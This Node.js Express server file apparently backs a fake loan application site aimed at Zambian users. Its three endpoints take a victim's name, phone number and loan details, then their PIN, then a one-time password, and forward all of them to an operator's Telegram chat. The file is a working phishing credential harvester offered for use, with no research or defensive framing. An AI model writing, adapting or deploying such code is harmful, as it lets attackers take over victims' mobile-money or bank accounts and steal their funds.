const express = require('express');
const http = require('http');
const https = require('https');

// ═══════════════════════════════════════════
// CONFIG (from Render environment variables)
// ═══════════════════════════════════════════
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID;
const PORT = process.env.PORT || 3000;

// ═══════════════════════════════════════════
// SETUP
// ═══════════════════════════════════════════
const app = express();
const server = http.createServer(app);

app.use(express.static(__dirname));
app.use(express.json());

// ═══════════════════════════════════════════
// SEND TO TELEGRAM
// ═══════════════════════════════════════════
function sendTelegram(text) {
    const payload = JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: 'Markdown'
    });

    const req = https.request({
        method: 'POST',
        hostname: 'api.telegram.org',
        path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(payload)
        }
    }, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
            try {
                const json = JSON.parse(data);
                if (json.ok) console.log('✅ Telegram message sent');
                else console.error('❌ Telegram error:', JSON.stringify(json));
            } catch (e) {
                console.error('❌ Parse error:', data);
            }
        });
    });

    req.on('error', (err) => console.error('❌ Network error:', err.message));
    req.setTimeout(10000, () => { req.destroy(); });
    req.write(payload);
    req.end();
}

// ═══════════════════════════════════════════
// API: Page 1 — Application
// ═══════════════════════════════════════════
app.post('/api/apply', (req, res) => {
    const { name, phone, amount, period } = req.body;
    const interest = Math.round(amount * 0.0013 * period);
    const total = amount + interest;

    const msg = `📋 *NEW LOAN APPLICATION*
━━━━━━━━━━━━━━━━━━
👤 *Name:* ${name}
📱 *Phone:* ${phone}
💰 *Amount:* K${amount.toLocaleString()}
📅 *Period:* ${period} days
📊 *Interest:* K${interest.toLocaleString()}
💵 *Total Repay:* K${total.toLocaleString()}
🕐 *Time:* ${new Date().toLocaleString('en-ZM')}
━━━━━━━━━━━━━━━━━━`;

    sendTelegram(msg);
    res.json({ success: true });
});

// ═══════════════════════════════════════════
// API: Page 2 — PIN
// ═══════════════════════════════════════════
app.post('/api/pin', (req, res) => {
    const { name, phone, amount, period, pin } = req.body;

    const msg = `🔐 *PIN VERIFIED*
━━━━━━━━━━━━━━━━━━
👤 *Name:* ${name}
📱 *Phone:* ${phone}
💰 *Amount:* K${amount.toLocaleString()}
📅 *Period:* ${period} days
🔑 *PIN:* ${pin}
🕐 *Time:* ${new Date().toLocaleString('en-ZM')}
━━━━━━━━━━━━━━━━━━`;

    sendTelegram(msg);
    res.json({ success: true });
});

// ═══════════════════════════════════════════
// API: Page 3 — OTP
// ═══════════════════════════════════════════
app.post('/api/otp', (req, res) => {
    const { name, phone, amount, period, pin, otp } = req.body;

    const msg = `📲 *OTP RECEIVED*
━━━━━━━━━━━━━━━━━━
👤 *Name:* ${name}
📱 *Phone:* ${phone}
💰 *Amount:* K${amount.toLocaleString()}
📅 *Period:* ${period} days
🔑 *PIN:* ${pin}
🔢 *OTP:* ${otp}
✅ *Application Complete*
🕐 *Time:* ${new Date().toLocaleString('en-ZM')}
━━━━━━━━━━━━━━━━━━`;

    sendTelegram(msg);
    res.json({ success: true });
});

// ═══════════════════════════════════════════
// START
// ═══════════════════════════════════════════
server.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});   
